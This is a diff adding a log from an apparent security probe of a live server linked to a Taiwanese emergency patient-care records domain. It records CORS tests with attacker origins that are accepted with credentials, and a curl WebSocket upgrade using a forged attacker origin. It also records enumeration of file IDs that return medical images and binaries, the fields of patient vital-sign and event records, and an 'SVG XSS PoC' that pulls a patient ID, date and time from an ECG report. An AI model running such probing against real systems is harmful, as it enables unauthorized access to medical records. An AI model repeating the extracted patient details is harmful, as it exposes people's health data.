@@ -1,0 +1,92 @@
+[*] Stage 6: socket.io CORS + 二进制文件识别 + SVG XSS PoC - 2026-08-30 18:40:29
+====================================================================================================
+
+[STEP 1] :3100/socket.io CORS 测试
+  [CORS] Origin=https://attacker.example                 → Access-Control-Allow-Credentials: true
+  [CORS] Origin=https://attacker.example                 → Access-Control-Allow-Origin: https://attacker.example
+  [CORS] Origin=https://evil.example.com                 → Access-Control-Allow-Credentials: true
+  [CORS] Origin=https://evil.example.com                 → Access-Control-Allow-Origin: https://evil.example.com
+  [CORS] Origin=http://localhost                         → Access-Control-Allow-Credentials: true
+  [CORS] Origin=http://localhost                         → Access-Control-Allow-Origin: http://localhost
+  [CORS] Origin=http://35.234.50.28                      → Access-Control-Allow-Credentials: true
+  [CORS] Origin=http://35.234.50.28                      → Access-Control-Allow-Origin: http://35.234.50.28
+  [CORS] Origin=http://epcr.tpf.gov.tw                   → Access-Control-Allow-Credentials: true
+  [CORS] Origin=http://epcr.tpf.gov.tw                   → Access-Control-Allow-Origin: http://epcr.tpf.gov.tw
+  [CORS] Origin=null                                     → Access-Control-Allow-Credentials: true
+  [CORS] Origin=null                                     → Access-Control-Allow-Origin: null
+  [CORS] Origin=                                         → Access-Control-Allow-Origin: *
+
+[STEP 2] :3100/socket.io WebSocket upgrade
+  [WS 升级失败] Command '['curl', '-sS', '-k', '-i', '-H', 'Connection: Upgrade', '-H', 'Upgrade: websocket', '-H', 'Sec-WebSocket-Version: 13', '-H', 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==', '-H', 'Origin: https://attacker.example', 'http://35.234.50.28:3100/socket.io/?EIO=4&transport=websocket']' timed out after 10 seconds
+
+[STEP 3] :3100/imageData/getFile 二进制文件类型 (fileId=21,23-27,31-34,37)
+  fileId=   21  status=HTTP/1.1 200 OK  CT=image/jpeg  CL=521840  magic=JPEG  sig=
+  fileId=   23  status=HTTP/1.1 200 OK  CT=image/jpeg  CL=536610  magic=JPEG  sig=
+  fileId=   24  status=HTTP/1.1 200 OK  CT=image/jpeg  CL=410011  magic=JPEG  sig=
+  fileId=   25  status=HTTP/1.1 200 OK  CT=image/jpeg  CL=534131  magic=JPEG  sig=
+  fileId=   26  status=HTTP/1.1 200 OK  CT=image/jpeg  CL=532353  magic=JPEG  sig=
+  fileId=   27  status=HTTP/1.1 200 OK  CT=image/jpeg  CL=531686  magic=JPEG  sig=
+  fileId=   31  status=HTTP/1.1 200 OK  CT=image/jpeg  CL=565574  magic=JPEG  sig=
+  fileId=   32  status=HTTP/1.1 200 OK  CT=image/jpeg  CL=526915  magic=JPEG  sig=
+  fileId=   33  status=HTTP/1.1 200 OK  CT=image/jpeg  CL=525903  magic=JPEG  sig=
+  fileId=   34  status=HTTP/1.1 200 OK  CT=image/jpeg  CL=526573  magic=JPEG  sig=
+  fileId=   37  status=HTTP/1.1 200 OK  CT=image/png  CL=230367  magic=PNG  sig=
+  fileId=   38  status=HTTP/1.1 200 OK  CT=image/png  CL=230367  magic=PNG  sig=
+  fileId=   39  status=HTTP/1.1 200 OK  CT=image/jpeg  CL=751349  magic=JPEG  sig=
+  fileId=   40  status=HTTP/1.1 200 OK  CT=image/jpeg  CL=779395  magic=JPEG  sig=
+  fileId=   41  status=HTTP/1.1 200 OK  CT=image/jpeg  CL=995140  magic=JPEG  sig=
+  fileId=   42  status=HTTP/1.1 200 OK  CT=image/jpeg  CL=792110  magic=JPEG  sig=
+  fileId=   43  status=HTTP/1.1 200 OK  CT=image/jpeg  CL=995143  magic=JPEG  sig=
+  fileId=   44  status=HTTP/1.1 200 OK  CT=image/jpeg  CL=935629  magic=JPEG  sig=
+  fileId=   45  status=HTTP/1.1 200 OK  CT=image/jpeg  CL=602704  magic=JPEG  sig=
+  fileId=   46  status=HTTP/1.1 200 OK  CT=image/jpeg  CL=705625  magic=JPEG  sig=
+  fileId=   47  status=HTTP/1.1 200 OK  CT=image/jpeg  CL=682277  magic=JPEG  sig=
+  fileId=   48  status=HTTP/1.1 200 OK  CT=image/jpeg  CL=873115  magic=JPEG  sig=
+  fileId=   49  status=HTTP/1.1 200 OK  CT=image/jpeg  CL=815671  magic=JPEG  sig=
+  fileId=   50  status=HTTP/1.1 200 OK  CT=image/jpeg  CL=974273  magic=JPEG  sig=
+  fileId=   99  status=HTTP/1.1 200 OK  CT=image/png  CL=4458  magic=PNG  sig=
+  fileId=  100  status=HTTP/1.1 200 OK  CT=image/png  CL=4479  magic=PNG  sig=
+  fileId=  500  status=HTTP/1.1 200 OK  CT=image/png  CL=4490  magic=PNG  sig=
+  fileId= 1000  status=HTTP/1.1 200 OK  CT=image/png  CL=4969  magic=PNG  sig=
+
+[STEP 4] :3100/videoData/getFile 二进制响应探测
+  fileId=  500  status=HTTP/1.1 200 OK  CT=application/octet-stream  CL=6965230  magic=  sig=464c5601050000000900000000120001
+  fileId= 1000  status=HTTP/1.1 404 Not Found  CT=text/html; charset=utf-8  CL=15  magic=  sig=46696c65206e6f7420666f756e642e
+  fileId= 5000  status=HTTP/1.1 404 Not Found  CT=text/html; charset=utf-8  CL=15  magic=  sig=46696c65206e6f7420666f756e642e
+  fileId= 9999  status=HTTP/1.1 404 Not Found  CT=text/html; charset=utf-8  CL=15  magic=  sig=46696c65206e6f7420666f756e642e
+
+[STEP 5] :3100/trendings, /events 元数据抽查
+  /trendings                     HTTP/1.1 200 OK  CT=application/json; charset=utf-8  records=100
+  /events                        HTTP/1.1 200 OK  CT=application/json; charset=utf-8  records=100
+  /trendings/1                   HTTP/1.1 200 OK  CT=application/json; charset=utf-8  fields=['id', 'CaseID', 'recordUuid', 'StartTime', 'EndTime', 'hr', 'pulseRate', 'spo2', 'respRate', 'temperature', 'etco2', 'cpp', 'nbp', 'NBPd', 'NBPs', 'NBPm', 'ABP', 'Ao', 'ART', 'PAP', 'RAP', 'CVP', 'LAP', 'ICP', 'P1', 'P2', 'unspecific', 'createdAt', 'updatedAt']
+  /events/1                      HTTP/1.1 200 OK  CT=application/json; charset=utf-8  fields=['id', 'CaseID', 'recordUuid', 'Caption', 'TypeOfEventTxt', 'TypeOfEventNum', 'Elapsed', 'Timestamp', 'Value', 'Unit', 'Systolic', 'Diastolic', 'Mean', 'BPUnit', 'ExceededAbove', 'AlarmedBPTypeTxt', 'AlarmedBPTypeNum', 'LimitValue', 'LimitUnit', 'Annotation', 'createdAt', 'updatedAt']
+  /trendings/100                 HTTP/1.1 200 OK  CT=application/json; charset=utf-8  fields=['id', 'CaseID', 'recordUuid', 'StartTime', 'EndTime', 'hr', 'pulseRate', 'spo2', 'respRate', 'temperature', 'etco2', 'cpp', 'nbp', 'NBPd', 'NBPs', 'NBPm', 'ABP', 'Ao', 'ART', 'PAP', 'RAP', 'CVP', 'LAP', 'ICP', 'P1', 'P2', 'unspecific', 'createdAt', 'updatedAt']
+  /events/100                    HTTP/1.1 200 OK  CT=application/json; charset=utf-8  fields=['id', 'CaseID', 'recordUuid', 'Caption', 'TypeOfEventTxt', 'TypeOfEventNum', 'Elapsed', 'Timestamp', 'Value', 'Unit', 'Systolic', 'Diastolic', 'Mean', 'BPUnit', 'ExceededAbove', 'AlarmedBPTypeTxt', 'AlarmedBPTypeNum', 'LimitValue', 'LimitUnit', 'Annotation', 'createdAt', 'updatedAt']
+
+[STEP 6] SVG XSS PoC - 提取 onload 处理器 + PII 上下文
+  [ONLOAD] onload 处理器: onload="Initialize(evt)"
+  [PII/META] <title>: context=<title>Philips 12Lead ECG</title>
+  <desc>Standard 12 Lead Report</desc>
+  <g id="textSegment1" style="font-size:40" transform="translate(0,50)" fill="black" font-size="35">
+    <text x="12" y="0" 
+  [PII/META] <desc>: context=<desc>Standard 12 Lead Report</desc>
+  <g id="textSegment1" style="font-size:40" transform="translate(0,50)" fill="black" font-size="35">
+    <text x="12" y="0" id="patientid">180717152801fed7</text
+  [PII/META] patient: context=patientid">180717152801fed7</text>
+    <text x="500" y="0" id="date">2018/7/17</text>
+    <text x="830" y="0" id="time">下午 03:42:55</text>
+    <text x="1100" y="0" id="patientname">
+    </text>
+ 
+  [PII/META] 180717152801: context=180717152801fed7</text>
+    <text x="500" y="0" id="date">2018/7/17</text>
+    <text x="830" y="0" id="time">下午 03:42:55</text>
+    <text x="1100" y="0" id="patientname">
+    </text>
+    <text x=
+  [PII/META] fed7: context=fed7</text>
+    <text x="500" y="0" id="date">2018/7/17</text>
+    <text x="830" y="0" id="time">下午 03:42:55</text>
+    <text x="1100" y="0" id="patientname">
+    </text>
+    <text x="2650" y="0"
